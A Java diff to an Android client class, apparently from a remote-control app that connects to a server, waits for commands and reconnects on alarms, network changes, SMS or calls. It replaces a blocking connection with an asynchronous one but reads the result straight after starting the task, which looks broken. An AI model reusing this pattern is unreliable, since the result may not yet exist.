@@ -39,7 +39,7 @@ public class Client extends ClientListener implements Controler {
 	/**
 	 * conn	Die Verbindung
 	 */
-	Connection conn;
+	AsyncConnection conn;
 
 	/**
 	 * nbAttempts	Wird per default auf 10 gesetzt. Diese Variable wird nach 5 Minuten um 5 verringert und nach 10 Minuten um 3.
@@ -162,7 +162,7 @@ public class Client extends ClientListener implements Controler {
 			/**
 			 * Neue Verbindung die die Ip und den Port verwendet. Es ist also die Verbindung zum Server.
 			 */
-			conn = new Connection(ip,port,this);//On se connecte et on lance les threads
+			conn = new AsyncConnection(ip,port,this);//On se connecte et on lance les threads
 			/**
 			 * Hier wird auf das Event gewartet das sich mit dem Server verbunden wird.
 			 */
@@ -175,7 +175,10 @@ public class Client extends ClientListener implements Controler {
 				/**
 				 * Überprüfen ob eine Verbindung bestehen.
 				 */
-				if(conn.connect()) {
+				conn.execute();
+				//if(conn.execute()) {
+				if(conn.returnResult()){
+
 					/**
 					 * Erstellen eines neuen Paket
 					 */
@@ -236,7 +239,9 @@ public class Client extends ClientListener implements Controler {
 				//On est ici soit par AlarmListener, ConnectivityManager, SMS/Call ou X
 				//Dans tout les cas le but ici est de se connecter
 				Log.i(TAG,"Connection by : "+who);
-				if(conn.connect()) {
+				conn.execute();
+				//if(conn.execute()) {
+				if (conn.returnResult()){
 					/**
 					 * Wenn eine Verbindung besteht so wird wieder der Thread zum warten auf Befehle gestartet.
 					 */
